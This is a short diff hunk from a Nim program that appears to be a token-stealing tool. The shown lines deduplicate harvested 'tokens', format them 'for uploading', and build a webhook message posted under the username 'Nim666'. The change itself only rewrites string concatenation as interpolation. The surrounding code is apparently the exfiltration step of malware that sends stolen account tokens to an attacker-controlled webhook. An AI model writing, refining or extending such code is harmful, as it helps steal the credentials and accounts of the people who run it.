@@ -65,7 +65,7 @@ if tokens.len == 0: ## Just in case no token ever gets found
     
 tokens = tokens.deduplicate ## Prepare tokens for uploading
 for c in tokens: hooktks.add(c & "\n")
-hooktks = "```\n" & hooktks.strip(leading=false) & "```"
+hooktks = &"```\n{hooktks.strip(leading=false)}```"
 var data = %*{ 
     "content": begin & hooktks, 
     "username": "Nim666" 
